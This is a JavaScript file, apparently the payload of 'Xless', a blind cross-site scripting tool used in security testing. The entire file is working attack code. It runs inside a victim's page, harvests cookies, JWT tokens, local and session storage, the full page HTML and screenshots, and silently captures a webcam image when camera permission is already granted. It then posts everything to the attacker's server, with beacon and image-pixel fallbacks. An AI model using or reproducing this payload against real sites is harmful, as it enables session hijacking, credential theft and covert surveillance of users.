// Xless: The serverless Blind XSS app.
// Author: Mazin Ahmed <mazin@mazinahmed.net>
(function () {
  // Resolve script origin — currentScript can be null when loaded via eval()
  var scriptSrc = "";
  try {
    if (document.currentScript && document.currentScript.src) {
      scriptSrc = document.currentScript.src;
    }
  } catch (e) { }

  // Fallback: find our script tag by searching DOM
  if (!scriptSrc) {
    try {
      var scripts = document.getElementsByTagName("script");
      for (var i = scripts.length - 1; i >= 0; i--) {
        if (scripts[i].src && scripts[i].src.indexOf("/c") === -1 && scripts[i].src.match(/https?:\/\//)) {
          scriptSrc = scripts[i].src;
          break;
        }
      }
    } catch (e) { }
  }

  function captureScreenshots() {
    if (typeof html2canvas === "undefined") return Promise.resolve([]);

    var results = [];
    var docW = Math.max(document.documentElement.scrollWidth, document.body.scrollWidth, window.innerWidth);
    var docH = Math.max(document.documentElement.scrollHeight, document.body.scrollHeight, window.innerHeight);
    var vpW = window.innerWidth || document.documentElement.clientWidth;
    var vpH = window.innerHeight || document.documentElement.clientHeight;

    // Screenshot 1: Full page (actual document size, capped at 4096px to avoid memory issues)
    function captureFullPage() {
      return html2canvas(document.documentElement, {
        letterRendering: 1,
        allowTaint: true,
        useCORS: true,
        width: Math.min(docW, 4096),
        height: Math.min(docH, 4096),
        windowWidth: docW,
        windowHeight: docH,
        scrollX: 0,
        scrollY: 0,
        x: 0,
        y: 0
      }).then(function (canvas) {
        results.push(canvas.toDataURL("image/png"));
      }).catch(function () {
        results.push("");
      });
    }

    // Screenshot 2: Current viewport (what the user actually sees)
    function captureViewport() {
      var scrollX = window.pageXOffset || document.documentElement.scrollLeft;
      var scrollY = window.pageYOffset || document.documentElement.scrollTop;
      return html2canvas(document.documentElement, {
        letterRendering: 1,
        allowTaint: true,
        useCORS: true,
        width: vpW,
        height: vpH,
        windowWidth: vpW,
        windowHeight: vpH,
        scrollX: scrollX,
        scrollY: scrollY,
        x: scrollX,
        y: scrollY
      }).then(function (canvas) {
        results.push(canvas.toDataURL("image/png"));
      }).catch(function () {
        results.push("");
      });
    }

    // Screenshot 3: Below the fold (scroll down and capture)
    function captureBelowFold() {
      if (docH <= vpH) return Promise.resolve(); // Page fits in viewport, skip
      var belowY = Math.min(vpH, docH - vpH);
      return html2canvas(document.documentElement, {
        letterRendering: 1,
        allowTaint: true,
        useCORS: true,
        width: Math.min(docW, 4096),
        height: vpH,
        windowWidth: vpW,
        windowHeight: vpH,
        scrollX: 0,
        scrollY: belowY,
        x: 0,
        y: belowY
      }).then(function (canvas) {
        results.push(canvas.toDataURL("image/png"));
      }).catch(function () {
        results.push("");
      });
    }

    return captureFullPage()
      .then(captureViewport)
      .then(captureBelowFold)
      .then(function () {
        return results.filter(function (r) { return r && r.length > 0; });
      })
      .catch(function () {
        return results.filter(function (r) { return r && r.length > 0; });
      });
  }

  function collectData() {
    var collectedData = {
      Location: function () {
        return location.toString();
      },
      "Document Domain": function () {
        return document.domain;
      },
      "Document Location": function () {
        return document.location.toString();
      },
      Cookies: function () {
        return document.cookie;
      },
      Referrer: function () {
        return document.referrer;
      },
      "User-Agent": function () {
        return navigator.userAgent;
      },
      "Browser Time": function () {
        return new Date().toTimeString();
      },
      Origin: function () {
        return location.origin;
      },
      "JWT Tokens": function () {
        // Attempt to find JWTs in localStorage, sessionStorage, and cookies
        var tokens = [];
        var jwtRegex = /ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*/g;

        function searchStorage(storage) {
          for (var i = 0; i < storage.length; i++) {
            var key = storage.key(i);
            var value = storage.getItem(key);
            if (value && typeof value === 'string') {
              var matches = value.match(jwtRegex);
              if (matches) {
                matches.forEach(function (m) {
                  if (!tokens.includes(m)) tokens.push(m);
                });
              }
            }
          }
        }

        try { searchStorage(localStorage); } catch (e) { }
        try { searchStorage(sessionStorage); } catch (e) { }
        try {
          if (document.cookie) {
            var cookieMatches = document.cookie.match(jwtRegex);
            if (cookieMatches) {
              cookieMatches.forEach(function (m) {
                if (!tokens.includes(m)) tokens.push(m);
              });
            }
          }
        } catch (e) { }

        return tokens.length > 0 ? tokens.join("\n") : "None found";
      },
      DOM: function () {
        return document.documentElement.outerHTML || "";
      },
      localStorage: function () {
        try { return JSON.stringify(localStorage); } catch (e) { return ""; }
      },
      sessionStorage: function () {
        try { return JSON.stringify(sessionStorage); } catch (e) { return ""; }
      },
      Webcam: function () {
        // Smart webcam capture: only if permission is already granted (no popup)
        return new Promise(function (resolve) {
          // Check if mediaDevices API is available
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return resolve("not supported");
          }

          function checkAndCapture() {
            return navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" } })
              .then(function (stream) {
                return new Promise(function (innerResolve) {
                  var video = document.createElement("video");
                  video.setAttribute("autoplay", "");
                  video.setAttribute("playsinline", "");
                  video.srcObject = stream;
                  video.play();

                  setTimeout(function () {
                    try {
                      var canvas = document.createElement("canvas");
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                      var dataUrl = canvas.toDataURL("image/png");

                      stream.getTracks().forEach(function (track) { track.stop(); });
                      video.srcObject = null;
                      innerResolve(dataUrl);
                    } catch (e) {
                      stream.getTracks().forEach(function (track) { track.stop(); });
                      innerResolve("capture failed");
                    }
                  }, 1500);
                });
              })
              .catch(function () {
                return "denied";
              });
          }

          // Use Permissions API to check without triggering popup
          if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: "camera" })
              .then(function (result) {
                if (result.state === "granted") {
                  checkAndCapture().then(resolve);
                } else {
                  resolve("no permission");
                }
              })
              .catch(function () {
                resolve("permission check unavailable");
              });
          } else {
            resolve("permissions API unavailable");
          }

          // Timeout safety: don't hang forever
          setTimeout(function () { resolve("timeout"); }, 8000);
        });
      },
    };

    // Capture screenshots separately (cached, only runs once)
    var screenshotPromise = captureScreenshots();

    return Promise.all(
      Object.keys(collectedData).map(function (key) {
        try {
          return Promise.resolve(collectedData[key]()).then(function (value) {
            collectedData[key] = value || "";
          });
        } catch (e) {
          collectedData[key] = "";
          return Promise.resolve();
        }
      }).concat([screenshotPromise])
    ).then(function () {
      var shots = [];
      try { shots = screenshotPromise.__result || []; } catch (e) { }
      return screenshotPromise.then(function (s) {
        shots = s || [];
        collectedData["Screenshot"] = shots.length > 0 ? shots[0] : "";
        collectedData["Screenshots"] = shots;
        return collectedData;
      });
    });
  }

  function exfiltrateLoot(collectedData) {
    if (!scriptSrc) return; // Can't determine server, bail

    var uri;
    try { uri = new URL(scriptSrc); } catch (e) { return; }
    var exfUrl = uri.origin + "/c";

    // Primary: XHR POST
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", exfUrl, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify(collectedData));
    } catch (e) {
      // Fallback: sendBeacon (works even if page navigates away)
      try {
        navigator.sendBeacon(exfUrl, JSON.stringify(collectedData));
      } catch (e2) {
        // Last resort: image pixel with minimal data
        try {
          var img = new Image();
          img.src = uri.origin + "/message?text=" + encodeURIComponent(
            "bXSS fired on " + collectedData["Location"] +
            " | Cookies: " + (collectedData["Cookies"] || "none")
          );
        } catch (e3) { }
      }
    }
  }

  function loadScript(src) {
    return new Promise(function (resolve) {
      var script = document.createElement("script");
      script.type = "text/javascript";
      script.async = true;
      script.onload = resolve;
      script.onerror = resolve; // Resolve on error too so chain continues
      script.src = src;
      (document.head || document.getElementsByTagName("head")[0] || document.documentElement).appendChild(script);
    });
  }

  // Load html2canvas dependency, then collect data and exfiltrate
  // CRITICAL: Even if html2canvas fails to load (CSP blocks CDN), we STILL collect data
  loadScript(
    "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"
  )
    .then(collectData)
    .then(exfiltrateLoot)
    .catch(function () {
      // If anything in the chain fails, still try to collect and send data
      collectData()
        .then(exfiltrateLoot)
        .catch(function () { });
    });
})();
